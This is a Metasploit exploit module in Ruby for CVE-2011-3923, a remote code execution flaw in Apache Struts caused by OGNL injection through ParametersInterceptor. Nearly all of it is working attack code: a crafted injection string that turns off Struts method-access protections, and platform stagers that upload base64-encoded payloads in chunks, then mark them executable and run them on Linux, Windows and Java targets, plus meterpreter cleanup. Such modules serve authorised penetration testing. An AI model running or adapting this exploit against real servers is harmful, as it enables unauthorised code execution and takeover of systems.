##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apache Struts ParametersInterceptor Remote Code Execution',
			'Description'    => %q{
				This module exploits a remote command execution vulnerability in
				Apache Struts versions < 2.3.1.2. This issue is caused because the
				ParametersInterceptor allows for the use of parentheses which in turn allows it to interpret
				parameter values as OGNL expressions during certain exception handling for mismatched
				data types of properties which allows remote attackers to execute arbitrary Java code
				via a crafted parameter.
			},
			'Author'         =>
				[
					'Richard Hicks <scriptmonkey.blog[at]gmail.com>', # Metasploit Module
					'Meder Kydyraliev', # Vulnerability Discovery and PoC
					'mihi', #ARCH_JAVA support
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2011-3923'],
					[ 'OSVDB', '78501'],
					[ 'URL', 'http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html'],
					[ 'URL', 'https://cwiki.apache.org/confluence/display/WW/S2-009']
				],
			'Platform'      => [ 'win', 'linux', 'java'],
			'Privileged'     => true,
			'Targets'        =>
				[
					['Windows Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'windows'
						}
					],
					['Linux Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux'
						}
					],
					[ 'Java Universal',
						{
								'Arch' => ARCH_JAVA,
								'Platform' => 'java'
						},
					]
				],
			'DisclosureDate' => 'Oct 01 2011',
			'DefaultTarget' => 1))

			register_options(
				[
					Opt::RPORT(8080),
					OptString.new('PARAMETER',[ true, 'The parameter to perform injection against.',"username"]),
					OptString.new('TARGETURI', [ true, 'The path to a struts application action with the location to perform the injection', "/blank-struts2/login.action?INJECT"]),
					OptString.new('CMD', [ false, 'Execute this command instead of using command stager', "" ])
				], self.class)
	end

	def execute_command(cmd, opts = {})
		inject = "PARAMETERTOKEN=(#context[\"xwork.MethodAccessor.denyMethodExecution\"]=+new+java.lang.Boolean(false),#_memberAccess[\"allowStaticMethodAccess\"]=+new+java.lang.Boolean(true),CMD)('meh')&z[(PARAMETERTOKEN)(meh)]=true"
		inject.gsub!(/PARAMETERTOKEN/,Rex::Text::uri_encode(datastore['Parameter']))
		if target['Platform'] == 'linux'
			lin_cmd = "@java.lang.Runtime@getRuntime().exec(\"CMD\".split(\"@\"))" #Set up special "linux" case.
			lin_cmd.gsub!(/CMD/,cmd) # wrap the actual CMD
			inject.gsub!(/CMD/,Rex::Text::uri_encode(lin_cmd)) # Insert the wrapped CMD into the main string.
		else
			inject.gsub!(/CMD/,Rex::Text::uri_encode(cmd)) # In java and Windows, just shove the CMD into place.
		end

		uri = String.new(datastore['TARGETURI'])
		uri.gsub!(/INJECT/,inject) # append the injection string
		resp = send_request_cgi({
			'uri'     => uri,
			'version' => '1.1',
			'method'  => 'GET',
		}, 15)
		
		return resp
	end

	def linux_stager
	cmds = "/bin/sh@-c@echo LINE | tee FILE"
	exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
	base64 = Rex::Text.encode_base64(exe)
	base64.gsub!(/\=/, "\\u003d")
	file = rand_text_alphanumeric(4+rand(4))

	execute_command("/bin/sh@-c@touch /tmp/#{file}.b64")
	cmds.gsub!(/FILE/, "/tmp/" + file + ".b64")
	base64.each_line do |line|
		line.chomp!
	cmd = cmds
	cmd.gsub!(/LINE/, line)
	execute_command(cmds)
	end

		execute_command("/bin/sh@-c@base64 -d /tmp/#{file}.b64|tee /tmp/#{file}")
		execute_command("/bin/sh@-c@chmod +x /tmp/#{file}")
		execute_command("/bin/sh@-c@rm /tmp/#{file}.b64")

		execute_command("/bin/sh@-c@/tmp/#{file}")
		@payload_exe = "/tmp/" + file
	end

	def java_upload_part(part, filename, append = 'false')
		cmd = ""
		cmd << "#f=new java.io.FileOutputStream('#{filename}',#{append}),"
		cmd << "#f.write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}')),"
		cmd << "#f.close()"
		execute_command(cmd)
	end

	def windows_stager
		@payload_exe = rand_text_alphanumeric(4+rand(4)) + ".exe"
		append = 'false'
		pe = generate_payload_exe
		chunk_length = 384 # 512 bytes when base64 encoded
		while pe.length > chunk_length
			java_upload_part(pe[0,chunk_length],@payload_exe,append)
			pe = pe[chunk_length, pe.length - chunk_length]
			append = true
		end
		java_upload_part(pe,@payload_exe,append)
		cmd = ""
		cmd << "@java.lang.Runtime@getRuntime().exec(\"./#{@payload_exe}\")"
		execute_command(cmd)
	end

	def java_stager
		@payload_exe = rand_text_alphanumeric(4+rand(4)) + ".jar"
		append = 'false'
		jar = payload.encoded_jar.pack

		chunk_length = 384 #512 bytes when base64 encoded

		while(jar.length > chunk_length)
			java_upload_part(jar[0,chunk_length], @payload_exe, append)
			jar = jar[chunk_length, jar.length - chunk_length]
			append='true'
		end
		java_upload_part(jar,@payload_exe, append)

		cmd = ""
		# disable vararg handling (since it is buggy in ognl used by struts 2.1
		cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),"
		cmd << "#q.setAccessible(true),#q.set(null,true),"
		cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),"
		cmd << "#q.setAccessible(true),#q.set(null,false),"
		# create classloader
		cmd << "#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('#{@payload_exe}').toURI().toURL()}),"
		# load class
		cmd << "#c=#cl.loadClass('metasploit.Payload'),"
		#invoke main
		cmd << "#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke("
		cmd << "null,new java.lang.Object[]{new java.lang.String[0]})"
		execute_command(cmd)
	end

	def on_new_session(client)
		if client.type !="meterpreter"
			print_error("Please use a meterpreter payload in order to automatically cleanup.")
			print_error("The #{@payload_exe} file must be removed manually.")
			return
		end

		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

		if client.sys.config.sysinfo["OS"] =~ Windows/
			print_error("Windows does not allow running executables to be deleted")
			print_error("The #{@payload_exe} file must be removed manually after migrating")
			return
		end

		print_warning("Deleting the #{@payload_exe} file")
		client.fs.file.rm(@payload_exe)

	end

	def check
		uri = String.new(datastore['TARGETURI'])
		check_cmd = "@java.lang.Thread@sleep(10000)"
		t1 = Time.now
		response = execute_command(check_cmd)
		t2 = Time.now
		delta = t2 - t1


		if response.nil?
			return Exploit::CheckCode::Safe
		elsif delta < 10
			return Exploit::CheckCode::Safe
		else
			return Exploit::CheckCode::Appears
		end
	end

	def exploit
		case target['Platform']
		when 'linux'
			linux_stager
		when 'java'
			java_stager
		when 'windows'
			windows_stager
		else
			fail_with(Exploit::Failure::NoTarget, 'Unsupported target platform!')
		end
		print_status("Executing user supplied command")
	end
end
